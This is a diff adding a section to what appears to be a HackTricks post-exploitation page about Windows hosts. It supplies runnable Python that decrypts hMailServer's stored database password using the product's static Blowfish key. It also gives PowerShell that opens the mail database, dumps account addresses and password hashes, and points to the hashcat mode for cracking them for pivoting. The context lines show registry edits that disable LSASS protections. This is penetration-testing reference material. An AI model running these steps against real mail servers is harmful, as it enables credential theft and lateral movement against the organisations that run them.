@@ -384,8 +384,38 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 
 * `DSRMAdminLogonBehavior=2` lets the DSRM administrator log on while the DC is online, giving attackers another built-in high-privilege account.
 * `RunAsPPL=0` removes LSASS PPL protections, making memory access trivial for dumpers such as LalsDumper.
 
+## hMailServer database credentials (post-compromise)
+
+hMailServer stores its DB password in `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` under `[Database] Password=`. The value is Blowfish-encrypted with the static key `THIS_KEY_IS_NOT_SECRET` and 4-byte word endianness swaps. Use the hex string from the INI with this Python snippet:
+
+```python
+from Crypto.Cipher import Blowfish
+import binascii
+
+def swap4(data):
+    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
+enc_hex = "HEX_FROM_HMAILSERVER_INI"
+enc = binascii.unhexlify(enc_hex)
+key = b"THIS_KEY_IS_NOT_SECRET"
+plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
+print(plain.decode())
+```
+
+With the clear-text password, copy the SQL CE database to avoid file locks, load the 32-bit provider, and upgrade if needed before querying hashes:
+
+```powershell
+Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
+Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
+$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
+$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
+$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
+$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
+```
+
+The `accountpassword` column uses the hMailServer hash format (hashcat mode `1421`). Cracking these values can provide reusable credentials for WinRM/SSH pivots.
 ## References
 
+- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
 - [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
 
 {{#include ../../banners/hacktricks-training.md}}
